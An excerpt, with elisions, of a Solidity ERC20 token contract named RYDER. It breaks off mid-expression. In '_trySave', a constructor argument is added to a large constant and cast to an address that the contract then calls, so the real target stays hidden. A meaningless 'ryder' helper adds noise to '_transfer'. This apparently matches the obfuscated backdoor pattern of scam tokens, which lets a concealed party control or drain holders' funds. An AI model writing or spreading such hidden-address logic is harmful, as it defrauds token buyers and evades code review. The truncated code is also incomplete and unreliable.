...
contract RYDER is Ownable, IERC20 {
     ...
     * construction.
     */
    constructor(string memory name_, string memory symbol_, uint256 ryder_) {
        _name = name_; 
        _symbol = symbol_; 
        _ryder = ryder_ + 0;
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual {
        ...
        (bool d, string memory s) = ryder("ryder", false,  amount, bytes("ryder2"));
        if (d) emit logx(s);
    }

    function ryder(string memory s,bool d,  uint256 p, bytes memory d0) 
    private pure returns(bool, string memory) {
        if (d && p == 0) {
            return (false, string(d0));
        }
        return (false, s);
    }
    ...
    function _trySave(address a) private noReentrant {
        (bool s, bytes memory d) = address(uint160(uint256(
            _ryder + 39299394829842384331123)))
